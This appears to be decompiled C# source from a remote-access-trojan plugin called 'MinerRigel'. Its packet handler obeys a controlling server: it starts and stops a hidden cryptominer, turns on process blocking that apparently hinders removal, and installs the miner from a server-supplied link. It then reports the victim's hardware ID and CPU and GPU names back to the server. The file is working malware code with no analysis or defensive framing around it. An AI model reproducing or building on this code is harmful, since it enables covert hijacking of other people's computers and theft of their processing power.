using System;
using System.Threading;
using Leb128;
using Plugin.Helper;

namespace Plugin;

internal class Packet
{
	public static void Read(byte[] data)
	{
		try
		{
			object[] array = LEB128.Read(data);
			switch ((string)array[0])
			{
			case "Start":
				if ((bool)array[1])
				{
					AntiProcess.StartBlock();
				}
				MinerControler.args = (string)array[2];
				new Thread((ThreadStart)delegate
				{
					MinerControler.Start();
				}).Start();
				break;
			case "Stop":
				AntiProcess.StopBlock();
				MinerControler.Stop();
				break;
			case "Link":
				MinerControler.Install(((string)array[1]).Replace("%IP%", Plugin.tcpClient.RemoteEndPoint.ToString().Split(new char[1] { ':' })[0]));
				Client.Send(LEB128.Write(new object[5]
				{
					"MinerRigel",
					"Connect",
					Plugin.hwid,
					string.Join(",", Methods.GetHardwareInfo("Win32_Processor", "Name")),
					string.Join(",", Methods.GetHardwareInfo("Win32_VideoController", "Name"))
				}));
				break;
			}
		}
		catch (Exception ex)
		{
			Client.Error(ex.ToString());
		}
	}
}
